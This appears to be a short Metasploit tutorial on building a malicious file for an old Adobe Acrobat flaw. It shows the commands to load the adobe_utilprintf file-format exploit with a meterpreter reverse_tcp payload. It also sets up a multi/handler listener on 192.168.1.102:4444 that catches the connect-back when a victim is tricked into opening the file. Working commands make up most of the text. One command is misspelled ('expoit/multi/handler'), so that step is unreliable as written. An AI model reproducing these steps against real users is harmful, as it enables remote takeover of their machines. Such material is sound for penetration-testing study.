# Creating malicious files

Not all exploits in msf is connecting to your target. Sometimes metasploit can create the exploit and then you need to get the target to click on it.

This of course require your target to have some vulnerability usually.

If your target for example uses an old version of Adobe Acrobat we can create a exploit for that.

```
use exploit/windows/fileformat/adobe_utilprintf

show options

set payload windows/meterpreter/reverse_tcp
exploit
```

So what we are doing here is first select the exploit, then we select what payload we want to have in that exploit. In this case we chose a reverse_tcp-shell.

Now we need to set up a handler to recieve the connect-back.

```
use expoit/multi/handler
set LHOST 192.168.1.102
set LPORT 4444
exploit
```

There, now we are up listening for the connect-back when the users clicks on the file.
We can look at the advances options to make sure that the listener is not exiting when you recieve a connect-back. So that you can keep listening for more connect-backs. 
